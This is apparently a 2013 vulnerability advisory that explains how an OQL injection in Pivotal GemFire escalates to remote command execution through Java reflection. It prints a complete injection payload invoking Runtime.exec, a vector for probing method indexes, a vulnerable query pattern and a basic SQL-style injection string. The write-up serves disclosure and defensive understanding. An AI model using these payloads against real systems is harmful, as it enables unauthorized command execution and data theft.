# GemFire: From OQLi to RCE through reflection

## ADVISORY INFORMATION
* *Title:*		GemFire: From OQLi to RCE through reflection
* *Discovery date:* 05/04/2013
* *Release date:* 	09/09/2013
* *Credits:* 
  * Alessandro Di Pinto ([@adipinto](https://twitter.com/adipinto))
  * Aristide Fattori ([@joystick](https://twitter.com/joystick))

## VULNERABILITY DETAILS
During a penetration testing activity, we had to assess the security of some web services that interacted with an underlying GemFire database. GemFire is an in-memory distributed data management platform providing dynamic scalability, high performance, and database-like persistence.
We identified a straight injection vulnerability that could be easily exploited to dump data out of GemFire. However, this was not challenging enough, so we investigated if it could be further leveraged to escalate from a common ```' OR '1'='1'--``` injection to a juicer remote code execution.

## Pivotal GemFire
GemFire offers a language OQL (Object Query Language) quite similar to SQL, with some limitations [1]. OQL injections are also very similar to classical SQL injections, they just require some care when crafting the attack, as many keywords are reserved for future use and not yet implemented (such as UNION). While skimming through the documentation, however, we stumbled upon a very interesting feature:

**Invoking methods with parameters**
```
SELECT DISTINCT * FROM /exampleRegion p WHERE p.name.startsWith('Bo')
```

It is possible to invoke java methods on objects returned by OQL queries directly inside statements. While very useful for legitimate users, this is also an extremely dangerous feature. Indeed, through some hacks and with some limitations, it is possible to execute arbitrary java code, and even arbitrary commands.

### Exploit
We will use an example to illustrate the exploit. Consider the following vulnerable query:

```query = "SELECT DISTINCT * FROM /tab p WHERE p.name = '" + name + "'";```

where *name* is an attacker-controlled value. Our goal is to execute arbitrary commands on the victim machine, and in Java the fastest way to do that is:

```Runtime.getRuntime().exec(command);```

Unfortunately, *Runtime* did not appear to be already imported, nor we could use its full binary name inside the query. However, thanks to Java reflection API [2] we can easily overcome the problem and build this equivalent payload:

```p.name.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(p.name.value.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null,null), 'command'.split('asd'))```

Analyzing the payload, for those not familiar with reflection, the first step is:

```getClass().forName('java.lang.Runtime')```

and causes the class loader to load class *Runtime*. It is impossible to directly instantiate an object of this class; rather, you need to invoke the static method **getRuntime()** to obtain an instance. Method **getDeclaredMethods()** returns an array containing each *Method* declared in the class. It is possible to list them with a small snippet of code:

```
int i = 0; 
for(java.lang.reflect.Method m : "".getClass().forName("java.lang.Runtime").getDeclaredMethods()) {
  System.out.println(i++ + " " + m); 
}
```

In this case, we are interested in methods 7 and 15:

```
... 
7 public static java.lang.Runtime java.lang.Runtime.getRuntime() 
... 
15 public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException 
...
```

However, beware that these indexes may vary according to the JDK that is used on the victim machine, so be sure to compile and run the snippet above with a matching JDK. If you are not sure which indexes to use, you can leverage reflection to discover them, by building an injection vector such as: 

```name = "123456789' OR p.name.value.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].getName() = 'getRuntime'--```

which will return true if method with index 7 is indeed **getRuntime()**.

To invoke a method through reflection, we use **Method.invoke()**. Since **getRuntime()** is static and does not want any parameter, we can pass just null to both arguments of **invoke()**.

```
// Equivalent to: Runtime.getRuntime()
p.name.value.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null,null) 
```

Our local java environment also accepted **invoke()** with just one null parameter, but this triggered an exception while trying to invoke it inside the OQL query. This is most likely due to the fact that the query processor of GemFire was unable to resolve the method and thus raised an exception.

Then, we must invoke **exec()** on the obtained *Runtime* instance, thus we leverage once again the **invoke()** method, but this time its first parameter will be the object returned by the piece of code to invoke **getRuntime()**:

```
// Equivalent to: Runtime.getRuntime.exec(COMMAND)
p.name.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(p.name.value.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null,null), COMMAND) 
```

The final note is on *COMMAND*. There are many overloaded **exec()** methods in class *Runtime*, we use the simplest one that just takes the command to be executed as a *String*. However, to pass a *String* parameter to **exec()** through **invoke()**, we must pass an *Object* array with one element (i.e., the command *String*). We were not able to create an array inline with the standard java syntax. Thus, we leveraged an hack: calling **split('asd')** on a string which does not contain *asd* will return an array of *String* with the string as the first and only element:

```
// Returns: {'command'}
'command'.split('asd')
```

Thus, we get to the final payload:

```p.name.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(p.name.value.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null,null), 'command'.split('asd'))```

As a final note, in our Java environment (both openjdk-7-jdk and the official Oracle version), the second argument of invoke() can be directly a String (rather than array). This did not work inside GemFire, probably for the same reason described above.

## Conclusions
Java Reflection based exploits are not novel, but always dangerous. For example, the Jboss SEAM framework was affected by a vulnerability that was exploited with a payload similar to the one we used in this case [3].

## References
[1] http://community.gemstone.com/display/gemfire/Querying - Gemfire OQL 
[2] http://docs.oracle.com/javase/tutorial/reflect/ - Java Reflection API
[3] CVE-2010-1871 - Jboss SEAM Remote Command Execution